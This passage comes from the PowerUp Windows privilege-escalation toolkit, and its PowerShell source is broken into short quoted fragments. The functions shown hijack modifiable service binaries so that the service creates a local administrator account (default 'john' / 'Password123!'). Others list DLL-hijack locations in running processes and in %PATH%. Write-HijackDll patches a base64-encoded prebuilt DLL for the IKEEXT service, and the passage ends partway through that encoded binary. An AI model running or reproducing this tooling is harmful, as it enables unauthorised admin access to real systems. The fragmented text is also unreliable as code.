 ','            ','   $Password','ToAdd = $Cre','dential.GetN','etworkCreden','tial().Passw','ord
        ','    }
      ','      else {','
           ','     $UserNa','meToAdd = $U','serName
    ','            ','$PasswordToA','dd = $Passwo','rd
         ','   }

      ','      if ($U','serNameToAdd','.Contains(''\',''')) {
      ','          # ','only adding ','a domain use','r to the loc','al group, no',' user creati','on
         ','       $Serv','iceCommand =',' "net localg','roup $LocalG','roup $UserNa','meToAdd /add','"
          ','  }
        ','    else {
 ','            ','   # create ','a local user',' and add it ','to the local',' specified g','roup
       ','         $Se','rviceCommand',' = "net user',' $UserNameTo','Add $Passwor','dToAdd /add ','&& timeout /','t 5 && net l','ocalgroup $L','ocalGroup $U','serNameToAdd',' /add"
     ','       }
   ','     }
    }','

    PROCES','S {
        ','$TargetServi','ce = Get-Ser','vice -Name $','Name -ErrorA','ction Stop
 ','       $Serv','iceDetails =',' $TargetServ','ice | Get-Se','rviceDetail
','        $Mod','ifiableFiles',' = $ServiceD','etails.PathN','ame | Get-Mo','difiablePath',' -Literal

 ','       if (-','not $Modifia','bleFiles) {
','            ','throw "Servi','ce binary ''$','($ServiceDet','ails.PathNam','e)'' for serv','ice $($Servi','ceDetails.Na','me) not modi','fiable by th','e current us','er."
       ',' }

        ','$ServicePath',' = $Modifiab','leFiles | Se','lect-Object ','-First 1 | S','elect-Object',' -ExpandProp','erty Modifia','blePath
    ','    $BackupP','ath = "$($Se','rvicePath).b','ak"

       ',' Write-Verbo','se "Backing ','up ''$Service','Path'' to ''$B','ackupPath''"
','
        try',' {
         ','   Copy-Item',' -Path $Serv','icePath -Des','tination $Ba','ckupPath -Fo','rce
        ','}
        ca','tch {
      ','      Write-','Warning "Err','or backing u','p ''$ServiceP','ath'' : $_"
 ','       }

  ','      $Resul','t = Write-Se','rviceBinary ','-Name $Servi','ceDetails.Na','me -Command ','$ServiceComm','and -Path $S','ervicePath
 ','       $Resu','lt | Add-Mem','ber Noteprop','erty ''Backup','Path'' $Backu','pPath
      ','  $Result.PS','Object.TypeN','ames.Insert(','0, ''PowerUp.','ServiceBinar','y.Installed''',')
        $R','esult
    }
','}


function',' Restore-Ser','viceBinary {','
<#
.SYNOPSI','S

Restores ','a service bi','nary backed ','up by Instal','l-ServiceBin','ary.

Author',': Will Schro','eder (@harmj','0y)  
Licens','e: BSD 3-Cla','use  
Requir','ed Dependenc','ies: Get-Ser','viceDetail, ','Get-Modifiab','lePath  

.D','ESCRIPTION

','Takes a serv','ice Name or ','a ServicePro','cess.Service','Controller o','n the pipeli','ne and
check','s for the ex','istence of a','n "OriginalS','erviceBinary','.exe.bak" in',' the service','
binary loca','tion. If it ','exists, the ','backup binar','y is restore','d to the ori','ginal
binary',' path.

.PAR','AMETER Name
','
The service',' name to res','tore a binar','y for.

.PAR','AMETER Backu','pPath

Optio','nal manual p','ath to the b','ackup binary','.

.EXAMPLE
','
Restore-Ser','viceBinary -','Name VulnSVC','

Restore th','e original b','inary for th','e service ''V','ulnSVC''.

.E','XAMPLE

Get-','Service Vuln','SVC | Restor','e-ServiceBin','ary

Restore',' the origina','l binary for',' the service',' ''VulnSVC''.
','
.EXAMPLE

R','estore-Servi','ceBinary -Na','me VulnSVC -','BackupPath ''','C:\temp\back','up.exe''

Res','tore the ori','ginal binary',' for the ser','vice ''VulnSV','C'' from a cu','stom locatio','n.

.OUTPUTS','

PowerUp.Se','rviceBinary.','Installed
#>','

    [Diagn','ostics.CodeA','nalysis.Supp','ressMessageA','ttribute(''PS','ShouldProces','s'', '''')]
   ',' [OutputType','(''PowerUp.Se','rviceBinary.','Restored'')]
','    [CmdletB','inding()]
  ','  Param(
   ','     [Parame','ter(Position',' = 0, Mandat','ory = $True,',' ValueFromPi','peline = $Tr','ue, ValueFro','mPipelineByP','ropertyName ','= $True)]
  ','      [Alias','(''ServiceNam','e'')]
       ',' [String]
  ','      [Valid','ateNotNullOr','Empty()]
   ','     $Name,
','
        [Pa','rameter(Posi','tion = 1)]
 ','       [Vali','dateScript({','Test-Path -P','ath $_ })]
 ','       [Stri','ng]
        ','$BackupPath
','    )

    P','ROCESS {
   ','     $Target','Service = Ge','t-Service -N','ame $Name -E','rrorAction S','top
        ','$ServiceDeta','ils = $Targe','tService | G','et-ServiceDe','tail
       ',' $Modifiable','Files = $Ser','viceDetails.','PathName | G','et-Modifiabl','ePath -Liter','al

        ','if (-not $Mo','difiableFile','s) {
       ','     throw "','Service bina','ry ''$($Servi','ceDetails.Pa','thName)'' for',' service $($','ServiceDetai','ls.Name) not',' modifiable ','by the curre','nt user."
  ','      }

   ','     $Servic','ePath = $Mod','ifiableFiles',' | Select-Ob','ject -First ','1 | Select-O','bject -Expan','dProperty Mo','difiablePath','
        $Ba','ckupPath = "','$($ServicePa','th).bak"

  ','      Copy-I','tem -Path $B','ackupPath -D','estination $','ServicePath ','-Force
     ','   Remove-It','em -Path $Ba','ckupPath -Fo','rce

       ',' $Out = New-','Object PSObj','ect
        ','$Out | Add-M','ember Notepr','operty ''Serv','iceName'' $Se','rviceDetails','.Name
      ','  $Out | Add','-Member Note','property ''Se','rvicePath'' $','ServicePath
','        $Out',' | Add-Membe','r Noteproper','ty ''BackupPa','th'' $BackupP','ath
        ','$Out.PSObjec','t.TypeNames.','Insert(0, ''P','owerUp.Servi','ceBinary.Res','tored'')
    ','    $Out
   ',' }
}


#####','############','############','############','############','###
#
# DLL ','Hijacking
#
','############','############','############','############','########

fu','nction Find-','ProcessDLLHi','jack {
<#
.S','YNOPSIS

Fin','ds all DLL h','ijack locati','ons for curr','ently runnin','g processes.','

Author: Wi','ll Schroeder',' (@harmj0y) ',' 
License: B','SD 3-Clause ',' 
Required D','ependencies:',' None  

.DE','SCRIPTION

E','numerates al','l currently ','running proc','esses with G','et-Process (','or accepts a','n
input proc','ess object f','rom Get-Proc','ess) and enu','merates the ','loaded modul','es for each.','
All loaded ','module name ','exists outsi','de of the pr','ocess binary',' base path, ','as those
are',' DLL load-or','der hijack c','andidates.

','.PARAMETER N','ame

The nam','e of a proce','ss to enumer','ate for poss','ible DLL pat','h hijack opp','ortunities.
','
.PARAMETER ','ExcludeWindo','ws

Exclude ','paths from C',':\Windows\* ','instead of j','ust C:\Windo','ws\System32\','*

.PARAMETE','R ExcludePro','gramFiles

E','xclude paths',' from C:\Pro','gram Files\*',' and C:\Prog','ram Files (x','86)\*

.PARA','METER Exclud','eOwned

Excl','ude processe','s the curren','t user owns.','

.EXAMPLE

','Find-Process','DLLHijack

F','inds possibl','e hijackable',' DLL locatio','ns for all p','rocesses.

.','EXAMPLE

Get','-Process Vul','nProcess | F','ind-ProcessD','LLHijack

Fi','nds possible',' hijackable ','DLL location','s for the ''V','ulnProcess'' ','processes.

','.EXAMPLE

Fi','nd-ProcessDL','LHijack -Exc','ludeWindows ','-ExcludeProg','ramFiles

Fi','nds possible',' hijackable ','DLL location','s not in C:\','Windows\* an','d
not in C:\','Program File','s\* or C:\Pr','ogram Files ','(x86)\*

.EX','AMPLE

Find-','ProcessDLLHi','jack -Exclud','eOwned

Find','s possible h','ijackable DL','L location f','or processes',' not owned b','y the
curren','t user.

.OU','TPUTS

Power','Up.Hijackabl','eDLL.Process','

.LINK

htt','ps://www.man','diant.com/bl','og/malware-p','ersistence-w','indows-regis','try/
#>

   ',' [Diagnostic','s.CodeAnalys','is.SuppressM','essageAttrib','ute(''PSShoul','dProcess'', ''',''')]
    [Out','putType(''Pow','erUp.Hijacka','bleDLL.Proce','ss'')]
    [C','mdletBinding','()]
    Para','m(
        [','Parameter(Po','sition = 0, ','ValueFromPip','eline = $Tru','e, ValueFrom','PipelineByPr','opertyName =',' $True)]
   ','     [Alias(','''ProcessName',''')]
        ','[String[]]
 ','       $Name',' = $(Get-Pro','cess | Selec','t-Object -Ex','pand Name),
','
        [Sw','itch]
      ','  $ExcludeWi','ndows,

    ','    [Switch]','
        $Ex','cludeProgram','Files,

    ','    [Switch]','
        $Ex','cludeOwned
 ','   )

    BE','GIN {
      ','  # the know','n DLL cache ','to exclude f','rom our find','ings
       ',' #   http://','blogs.msdn.c','om/b/larryos','terman/archi','ve/2004/07/1','9/187752.asp','x
        $K','eys = (Get-I','tem "HKLM:\S','ystem\Curren','tControlSet\','Control\Sess','ion Manager\','KnownDLLs")
','        $Kno','wnDLLs = $(F','orEach ($Key','Name in $Key','s.GetValueNa','mes()) { $Ke','ys.GetValue(','$KeyName).to','lower() }) |',' Where-Objec','t { $_.EndsW','ith(".dll") ','}
        $K','nownDLLPaths',' = $(ForEach',' ($name in $','Keys.GetValu','eNames()) { ','$Keys.GetVal','ue($name).to','lower() }) |',' Where-Objec','t { -not $_.','EndsWith(".d','ll") }
     ','   $KnownDLL','s += ForEach',' ($path in $','KnownDLLPath','s) { ls -for','ce $path\*.d','ll | Select-','Object -Expa','ndProperty N','ame | ForEac','h-Object { $','_.tolower() ','}}
        $','CurrentUser ','= [System.Se','curity.Princ','ipal.Windows','Identity]::G','etCurrent().','Name

      ','  # get the ','owners for a','ll processes','
        $Ow','ners = @{}
 ','       Get-W','miObject -Cl','ass win32_pr','ocess | Wher','e-Object {$_','} | ForEach-','Object { $Ow','ners[$_.hand','le] = $_.get','owner().user',' }
    }

  ','  PROCESS {
','
        For','Each ($Proce','ssName in $N','ame) {

    ','        $Tar','getProcess =',' Get-Process',' -Name $Proc','essName

   ','         if ','($TargetProc','ess -and $Ta','rgetProcess.','Path -and ($','TargetProces','s.Path -ne ''',''') -and ($Nu','ll -ne $Targ','etProcess.Pa','th)) {

    ','            ','try {
      ','            ','  $BasePath ','= $TargetPro','cess.Path | ','Split-Path -','Parent
     ','            ','   $LoadedMo','dules = $Tar','getProcess.M','odules
     ','            ','   $ProcessO','wner = $Owne','rs[$TargetPr','ocess.Id.ToS','tring()]

  ','            ','      ForEac','h ($Module i','n $LoadedMod','ules){

    ','            ','        $Mod','ulePath = "$','BasePath\$($','Module.Modul','eName)"

   ','            ','         # i','f the module',' path doesn''','t exist in t','he process b','ase path fol','der
        ','            ','    if ((-no','t $ModulePat','h.Contains(''','C:\Windows\S','ystem32'')) -','and (-not (T','est-Path -Pa','th $ModulePa','th)) -and ($','KnownDLLs -N','otContains $','Module.Modul','eName)) {

 ','            ','            ','   $Exclude ','= $False

  ','            ','            ','  if ($PSBou','ndParameters','[''ExcludeWin','dows''] -and ','$ModulePath.','Contains(''C:','\Windows'')) ','{
          ','            ','          $E','xclude = $Tr','ue
         ','            ','       }

  ','            ','            ','  if ($PSBou','ndParameters','[''ExcludePro','gramFiles''] ','-and $Module','Path.Contain','s(''C:\Progra','m Files'')) {','
           ','            ','         $Ex','clude = $Tru','e
          ','            ','      }

   ','            ','            ',' if ($PSBoun','dParameters[','''ExcludeOwne','d''] -and $Cu','rrentUser.Co','ntains($Proc','essOwner)) {','
           ','            ','         $Ex','clude = $Tru','e
          ','            ','      }

   ','            ','            ',' # output th','e process na','me and hijac','kable path i','f exclusion ','wasn''t marke','d
          ','            ','      if (-n','ot $Exclude)','{
          ','            ','          $O','ut = New-Obj','ect PSObject','
           ','            ','         $Ou','t | Add-Memb','er Noteprope','rty ''Process','Name'' $Targe','tProcess.Pro','cessName
   ','            ','            ','     $Out | ','Add-Member N','oteproperty ','''ProcessPath',''' $TargetPro','cess.Path
  ','            ','            ','      $Out |',' Add-Member ','Noteproperty',' ''ProcessOwn','er'' $Process','Owner
      ','            ','            ','  $Out | Add','-Member Note','property ''Pr','ocessHijacka','bleDLL'' $Mod','ulePath
    ','            ','            ','    $Out.PSO','bject.TypeNa','mes.Insert(0',', ''PowerUp.H','ijackableDLL','.Process'')
 ','            ','            ','       $Out
','            ','            ','    }
      ','            ','      }
    ','            ','    }
      ','          }
','            ','    catch {
','            ','        Writ','e-Verbose "E','rror: $_"
  ','            ','  }
        ','    }
      ','  }
    }
}
','

function F','ind-PathDLLH','ijack {
<#
.','SYNOPSIS

Fi','nds all dire','ctories in t','he system %P','ATH% that ar','e modifiable',' by the curr','ent user.

A','uthor: Will ','Schroeder (@','harmj0y)  
L','icense: BSD ','3-Clause  
R','equired Depe','ndencies: Ge','t-Modifiable','Path  

.DES','CRIPTION

En','umerates the',' paths store','d in Env:Pat','h (%PATH) an','d filters ea','ch through G','et-Modifiabl','ePath
to ret','urn the fold','er paths the',' current use','r can write ','to. On Windo','ws 7, if wlb','sctrl.dll is','
written to ','one of these',' paths, exec','ution for th','e IKEEXT can',' be hijacked',' due to DLL ','search
order',' loading.

.','EXAMPLE

Fin','d-PathDLLHij','ack

Finds a','ll %PATH% .D','LL hijacking',' opportuniti','es.

.OUTPUT','S

PowerUp.H','ijackableDLL','.Path

.LINK','

http://www','.greyhathack','er.net/?p=73','8
#>

    [D','iagnostics.C','odeAnalysis.','SuppressMess','ageAttribute','(''PSShouldPr','ocess'', '''')]','
    [Output','Type(''PowerU','p.Hijackable','DLL.Path'')]
','    [CmdletB','inding()]
  ','  Param()

 ','   # use -Li','teral so the',' spaces in %','PATH% folder','s are not to','kenized
    ','Get-Item Env',':Path | Sele','ct-Object -E','xpandPropert','y Value | Fo','rEach-Object',' { $_.split(',''';'') } | Whe','re-Object {$','_ -and ($_ -','ne '''')} | Fo','rEach-Object',' {
        $','TargetPath =',' $_
        ','$Modifidable','Paths = $Tar','getPath | Ge','t-Modifiable','Path -Litera','l | Where-Ob','ject {$_ -an','d ($Null -ne',' $_) -and ($','Null -ne $_.','ModifiablePa','th) -and ($_','.ModifiableP','ath.Trim() -','ne '''')}
    ','    ForEach ','($Modifidabl','ePath in $Mo','difidablePat','hs) {
      ','      if ($N','ull -ne $Mod','ifidablePath','.ModifiableP','ath) {
     ','           $','ModifidableP','ath | Add-Me','mber Notepro','perty ''%PATH','%'' $_
      ','          $M','odifidablePa','th | Add-Mem','ber Aliaspro','perty Name ''','%PATH%''
    ','            ','$Modifidable','Path.PSObjec','t.TypeNames.','Insert(0, ''P','owerUp.Hijac','kableDLL.Pat','h'')
        ','        $Mod','ifidablePath','
           ',' }
        }','
    }
}


f','unction Writ','e-HijackDll ','{
<#
.SYNOPS','IS

Patches ','in the path ','to a specifi','ed .bat (con','taining the ','specified co','mmand) into ','a
pre-compil','ed hijackabl','e C++ DLL wr','ites the DLL',' out to the ','specified Se','rvicePath lo','cation.

Aut','hor: Will Sc','hroeder (@ha','rmj0y)  
Lic','ense: BSD 3-','Clause  
Req','uired Depend','encies: None','  

.DESCRIP','TION

First ','builds a sel','f-deleting .','bat file tha','t executes t','he specified',' -Command or',' local user,','
to add and ','writes the.b','at out to -B','atPath. The ','BatPath is t','hen patched ','into a pre-c','ompiled
C++ ','DLL that is ','built to be ','hijackable b','y the IKEEXT',' service. Th','ere are two ','DLLs, one fo','r
x86 and on','e for x64, a','nd both are ','contained as',' base64-enco','ded strings.',' The DLL is ','then
written',' out to the ','specified Ou','tputFile.

.','PARAMETER Dl','lPath

File ','name to writ','e the genera','ted DLL out ','to.

.PARAME','TER Architec','ture

The Ar','chitecture t','o generate f','or the DLL, ','x86 or x64. ','If not speci','fied, PowerU','p
will try t','o automatica','lly determin','e the correc','t architectu','re.

.PARAME','TER BatPath
','
Path to the',' .bat for th','e DLL to lau','nch.

.PARAM','ETER UserNam','e

The [doma','in\]username',' to add. If ','not given, i','t defaults t','o "john".
Do','main users a','re not creat','ed, only add','ed to the sp','ecified loca','lgroup.

.PA','RAMETER Pass','word

The pa','ssword to se','t for the ad','ded user. If',' not given, ','it defaults ','to "Password','123!"

.PARA','METER LocalG','roup

Local ','group name t','o add the us','er to (defau','lt of ''Admin','istrators'').','

.PARAMETER',' Credential
','
A [Manageme','nt.Automatio','n.PSCredenti','al] object s','pecifying th','e user/passw','ord to add.
','
.PARAMETER ','Command

Cus','tom command ','to execute i','nstead of us','er creation.','

.OUTPUTS

','PowerUp.Hija','ckableDLL
#>','

    [Diagn','ostics.CodeA','nalysis.Supp','ressMessageA','ttribute(''PS','ShouldProces','s'', '''')]
   ',' [Diagnostic','s.CodeAnalys','is.SuppressM','essageAttrib','ute(''PSAvoid','UsingUserNam','eAndPassWord','Params'', '''')',']
    [Diagn','ostics.CodeA','nalysis.Supp','ressMessageA','ttribute(''PS','AvoidUsingPl','ainTextForPa','ssword'', '''')',']
    [Outpu','tType(''Power','Up.Hijackabl','eDLL'')]
    ','[CmdletBindi','ng()]
    Pa','ram(
       ',' [Parameter(','Mandatory = ','$True)]
    ','    [String]','
        [Va','lidateNotNul','lOrEmpty()]
','        $Dll','Path,

     ','   [String]
','        [Val','idateSet(''x8','6'', ''x64'')]
','        $Arc','hitecture,

','        [Str','ing]
       ',' [ValidateNo','tNullOrEmpty','()]
        ','$BatPath,

 ','       [Stri','ng]
        ','$UserName = ','''john'',

   ','     [String',']
        $P','assword = ''P','assword123!''',',

        [','String]
    ','    $LocalGr','oup = ''Admin','istrators'',
','
        [Ma','nagement.Aut','omation.PSCr','edential]
  ','      [Manag','ement.Automa','tion.Credent','ialAttribute','()]
        ','$Credential ','= [Managemen','t.Automation','.PSCredentia','l]::Empty,

','        [Str','ing]
       ',' [ValidateNo','tNullOrEmpty','()]
        ','$Command
   ',' )

    func','tion local:I','nvoke-PatchD','ll {
    <#
','    .SYNOPSI','S

    Helpe','rs that patc','hes a string',' in a binary',' byte array.','

    .PARAM','ETER DllByte','s

    The b','inary blob t','o patch.

  ','  .PARAMETER',' SearchStrin','g

    The s','tring to rep','lace in the ','blob.

    .','PARAMETER Re','placeString
','
    The str','ing to repla','ce SearchStr','ing with.
  ','  #>

      ','  [OutputTyp','e(''System.By','te[]'')]
    ','    [CmdletB','inding()]
  ','      Param(','
           ',' [Parameter(','Mandatory = ','$True)]
    ','        [Byt','e[]]
       ','     $DllByt','es,

       ','     [Parame','ter(Mandator','y = $True)]
','            ','[String]
   ','         $Se','archString,
','
           ',' [Parameter(','Mandatory = ','$True)]
    ','        [Str','ing]
       ','     $Replac','eString
    ','    )

     ','   $ReplaceS','tringBytes =',' ([System.Te','xt.Encoding]','::UTF8).GetB','ytes($Replac','eString)

  ','      $Index',' = 0
       ',' $S = [Syste','m.Text.Encod','ing]::ASCII.','GetString($D','llBytes)
   ','     $Index ','= $S.IndexOf','($SearchStri','ng)

       ',' if ($Index ','-eq 0) {
   ','         thr','ow("Could no','t find strin','g $SearchStr','ing !")
    ','    }

     ','   for ($i=0','; $i -lt $Re','placeStringB','ytes.Length;',' $i++) {
   ','         $Dl','lBytes[$Inde','x+$i]=$Repla','ceStringByte','s[$i]
      ','  }

       ',' return $Dll','Bytes
    }
','
    if ($PS','BoundParamet','ers[''Command',''']) {
      ','  $BatComman','d = $Command','
    }
    e','lse {
      ','  if ($PSBou','ndParameters','[''Credential',''']) {
      ','      $UserN','ameToAdd = $','Credential.U','serName
    ','        $Pas','swordToAdd =',' $Credential','.GetNetworkC','redential().','Password
   ','     }
     ','   else {
  ','          $U','serNameToAdd',' = $UserName','
           ',' $PasswordTo','Add = $Passw','ord
        ','}

        i','f ($UserName','ToAdd.Contai','ns(''\'')) {
 ','           #',' only adding',' a domain us','er to the lo','cal group, n','o user creat','ion
        ','    $BatComm','and = "net l','ocalgroup $L','ocalGroup $U','serNameToAdd',' /add"
     ','   }
       ',' else {
    ','        # cr','eate a local',' user and ad','d it to the ','local specif','ied group
  ','          $B','atCommand = ','"net user $U','serNameToAdd',' $PasswordTo','Add /add && ','timeout /t 5',' && net loca','lgroup $Loca','lGroup $User','NameToAdd /a','dd"
        ','}
    }

   ',' # generate ','with base64 ','-w 0 hijack3','2.dll > hija','ck32.b64
   ',' $DllBytes32',' = "TVqQAAMA','AAAEAAAA//8A','ALgAAAAAAAAA','QAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','6AAAAA4fug4A','tAnNIbgBTM0h','VGhpcyBwcm9n','cmFtIGNhbm5v','dCBiZSBydW4g','aW4gRE9TIG1v','ZGUuDQ0KJAAA','AAAAAAA4hlvq','fOc1uXznNbl8','5zW5Z3qeuWXn','Nblnequ5cuc1','uWd6n7k+5zW5','dZ+muXvnNbl8','5zS5O+c1uWd6','mrl/5zW5Z3qo','uX3nNblSaWNo','fOc1uQAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AFBFAABMAQUA','NgBCVgAAAAAA','AAAA4AACIQsB','CgAATAAAAEoA','AAAAAABcEwAA','ABAAAABgAAAA','AAAQABAAAAAC','AAAFAAEAAAAA','AAUAAQAAAAAA','ANAAAAAEAACH','7wAAAgBAAQAA','EAAAEAAAAAAQ','AAAQAAAAAAAA','EAAAAAAAAAAA','AAAAHIQAAFAA','AAAAsAAAtAEA','AAAAAAAAAAAA','AAAAAAAAAAAA','wAAAMAcAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAsIAAAEAA','AAAAAAAAAAAA','AABgAAAAAQAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAALnRl','eHQAAABMSwAA','ABAAAABMAAAA','BAAAAAAAAAAA','AAAAAAAAIAAA','YC5yZGF0YQAA','BCoAAABgAAAA','LAAAAFAAAAAA','AAAAAAAAAAAA','AEAAAEAuZGF0','YQAAAHwZAAAA','kAAAAAwAAAB8','AAAAAAAAAAAA','AAAAAABAAADA','LnJzcmMAAAC0','AQAAALAAAAAC','AAAAiAAAAAAA','AAAAAAAAAAAA','QAAAQC5yZWxv','YwAArg8AAADA','AAAAEAAAAIoA','AAAAAAAAAAAA','AAAAAEAAAEIA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AFWL7IPsIKEA','kAAQM8WJRfyN','RehQaP8BDwD/','FRhgABBQ/xUI','YAAQhcB1BTPA','QOtTjUXgUGgg','gAAQagD/FQRg','ABCFwHTmi0Xg','agCJRfCLReRq','AGoQiUX0jUXs','UGoA/3Xox0Xs','AQAAAMdF+AIA','AAD/FQBgABCF','wHSz/3Xo/xUQ','YAAQM8CLTfwz','zehcAAAAycNW','izUUYAAQaPoA','AAD/1uhf////','hcB1H1BQaDiA','ABBojIAAEGio','gAAQUP8V+GAA','EGjoAwAA/9Yz','wF7DVYvsaAQB','AADoIgAAAItF','DEhZdQXorf//','/zPAQF3CDAA7','DQCQABB1AvPD','6YgCAACL/1WL','7F3p0gMAAGoI','aACCABDo8hMA','AItFDIP4AXV6','6KYTAACFwHUH','M8DpOAEAAOiQ','BwAAhcB1B+ir','EwAA6+noOhMA','AP8VJGAAEKN4','qQAQ6JMSAACj','hJsAEOjADAAA','hcB5B+g8BAAA','68/ovhEAAIXA','eCDoPw8AAIXA','eBdqAOiCCgAA','WYXAdQv/BYCb','ABDp0gAAAOjM','DgAA68kz/zvH','dVs5PYCbABB+','gf8NgJsAEIl9','/Dk9DJ8AEHUF','6DQMAAA5fRB1','D+icDgAA6NcD','AADoFxMAAMdF','/P7////oBwAA','AOmCAAAAM/85','fRB1DoM9QJAA','EP90BeisAwAA','w+tqg/gCdVno','awMAAGgUAgAA','agHorggAAFlZ','i/A79w+EDP//','/1b/NUCQABD/','NdSeABD/FSBg','ABD/0IXAdBdX','VuikAwAAWVn/','FRxgABCJBoNO','BP/rGFbo7QcA','AFnp0P7//4P4','A3UHV+jzBQAA','WTPAQOjiEgAA','wgwAagxoIIIA','EOiOEgAAi/mL','8otdCDPAQIlF','5IX2dQw5FYCb','ABAPhMUAAACD','ZfwAO/B0BYP+','AnUuoTBhABCF','wHQIV1ZT/9CJ','ReSDfeQAD4SW','AAAAV1ZT6EP+','//+JReSFwA+E','gwAAAFdWU+j2','/f//iUXkg/4B','dSSFwHUgV1BT','6OL9//9XagBT','6BP+//+hMGEA','EIXAdAZXagBT','/9CF9nQFg/4D','dSZXVlPo8/3/','/4XAdQMhReSD','feQAdBGhMGEA','EIXAdAhXVlP/','0IlF5MdF/P7/','//+LReTrHYtF','7IsIiwlQUejy','FAAAWVnDi2Xo','x0X8/v///zPA','6OoRAADDi/9V','i+yDfQwBdQXo','7RQAAP91CItN','EItVDOjs/v//','WV3CDACL/1WL','7IHsKAMAAKOg','nAAQiQ2cnAAQ','iRWYnAAQiR2U','nAAQiTWQnAAQ','iT2MnAAQZowV','uJwAEGaMDayc','ABBmjB2InAAQ','ZowFhJwAEGaM','JYCcABBmjC18','nAAQnI8FsJwA','EItFAKOknAAQ','i0UEo6icABCN','RQijtJwAEIuF','4Pz//8cF8JsA','EAEAAQChqJwA','EKOkmwAQxwWY','mwAQCQQAwMcF','nJsAEAEAAACh','AJAAEImF2Pz/','/6EEkAAQiYXc','/P///xU0YAAQ','o+ibABBqAeio','FAAAWWoA/xUw','YAAQaDRhABD/','FSxgABCDPeib','ABAAdQhqAeiE','FAAAWWgJBADA','/xUYYAAQUP8V','KGAAEMnDxwFA','YQAQ6SkVAACL','/1WL7FaL8ccG','QGEAEOgWFQAA','9kUIAXQHVuiS','FQAAWYvGXl3C','BACL/1WL7Fb/','dQiL8egkFQAA','xwZAYQAQi8Ze','XcIEAIv/VYvs','g+wQ6w3/dQjo','QxcAAFmFwHQP','/3UI6JMWAABZ','hcB05snD9gXI','ngAQAb+8ngAQ','vkBhABB1LIMN','yJ4AEAFqAY1F','/FCLz8dF/Ehh','ABDo1BMAAGg4','WwAQiTW8ngAQ','6DcWAABZV41N','8OipFAAAaDyC','ABCNRfBQiXXw','6P4WAADMagD/','FThgABDD/xU8','YAAQwgQAi/9W','/zVEkAAQ/xVA','YAAQi/CF9nUb','/zXQngAQ/xUg','YAAQi/BW/zVE','kAAQ/xVEYAAQ','i8Zew6FAkAAQ','g/j/dBZQ/zXY','ngAQ/xUgYAAQ','/9CDDUCQABD/','oUSQABCD+P90','DlD/FUhgABCD','DUSQABD/6RAX','AABqCGiQggAQ','6B0PAABoWGEA','EP8VUGAAEIt1','CMdGXMhhABCD','ZggAM/9HiX4U','iX5wxobIAAAA','Q8aGSwEAAEPH','RmgYlAAQag3o','9hcAAFmDZfwA','/3Zo/xVMYAAQ','x0X8/v///+g+','AAAAagzo1RcA','AFmJffyLRQyJ','RmyFwHUIoRCU','ABCJRmz/dmzo','6hcAAFnHRfz+','////6BUAAADo','0w4AAMMz/0eL','dQhqDei+FgAA','WcNqDOi1FgAA','WcOL/1ZX/xVY','YAAQ/zVAkAAQ','i/joxP7////Q','i/CF9nVOaBQC','AABqAej/AwAA','i/BZWYX2dDpW','/zVAkAAQ/zXU','ngAQ/xUgYAAQ','/9CFwHQYagBW','6Pj+//9ZWf8V','HGAAEINOBP+J','BusJVuhBAwAA','WTP2V/8VVGAA','EF+Lxl7Di/9W','6H////+L8IX2','dQhqEOjeBgAA','WYvGXsNqCGi4','ggAQ6NYNAACL','dQiF9g+E+AAA','AItGJIXAdAdQ','6PQCAABZi0Ys','hcB0B1Do5gIA','AFmLRjSFwHQH','UOjYAgAAWYtG','PIXAdAdQ6MoC','AABZi0ZAhcB0','B1DovAIAAFmL','RkSFwHQHUOiu','AgAAWYtGSIXA','dAdQ6KACAABZ','i0ZcPchhABB0','B1DojwIAAFlq','DehoFgAAWYNl','/ACLfmiF/3Qa','V/8VXGAAEIXA','dQ+B/xiUABB0','B1foYgIAAFnH','Rfz+////6FcA','AABqDOgvFgAA','WcdF/AEAAACL','fmyF/3QjV+jc','FgAAWTs9EJQA','EHQUgf84kwAQ','dAyDPwB1B1fo','WRcAAFnHRfz+','////6B4AAABW','6AoCAABZ6BMN','AADCBACLdQhq','Dej/FAAAWcOL','dQhqDOjzFAAA','WcOL/1WL7IM9','QJAAEP90S4N9','CAB1J1b/NUSQ','ABCLNUBgABD/','1oXAdBP/NUCQ','ABD/NUSQABD/','1v/QiUUIXmoA','/zVAkAAQ/zXU','ngAQ/xUgYAAQ','/9D/dQjoeP7/','/6FEkAAQg/j/','dAlqAFD/FURg','ABBdw4v/V2hY','YQAQ/xVQYAAQ','i/iF/3UJ6Mb8','//8zwF/DVos1','YGAAEGiUYQAQ','V//WaIhhABBX','o8yeABD/1mh8','YQAQV6PQngAQ','/9ZodGEAEFej','1J4AEP/Wgz3M','ngAQAIs1RGAA','EKPYngAQdBaD','PdCeABAAdA2D','PdSeABAAdASF','wHUkoUBgABCj','0J4AEKFIYAAQ','xwXMngAQXRUA','EIk11J4AEKPY','ngAQ/xU8YAAQ','o0SQABCD+P8P','hMEAAAD/NdCe','ABBQ/9aFwA+E','sAAAAOgeAgAA','/zXMngAQizU4','YAAQ/9b/NdCe','ABCjzJ4AEP/W','/zXUngAQo9Ce','ABD/1v812J4A','EKPUngAQ/9aj','2J4AEOjYEgAA','hcB0Y4s9IGAA','EGgeFwAQ/zXM','ngAQ/9f/0KNA','kAAQg/j/dERo','FAIAAGoB6MEA','AACL8FlZhfZ0','MFb/NUCQABD/','NdSeABD/1//Q','hcB0G2oAVui+','+///WVn/FRxg','ABCDTgT/iQYz','wEDrB+hp+///','M8BeX8OL/1WL','7IN9CAB0Lf91','CGo